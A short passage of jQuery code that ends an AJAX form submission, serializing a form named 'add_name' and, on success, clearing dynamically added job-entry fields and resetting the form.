                data:$('#add_name').serialize(),
                type:'json',
                success:function(data)  
                {
                    i=1;
                    $('.dynamic-added_pekerjaan').remove();
                    $('#add_name')[0].reset();
                }  
           });  
      });


    }); 


     
  </script>

 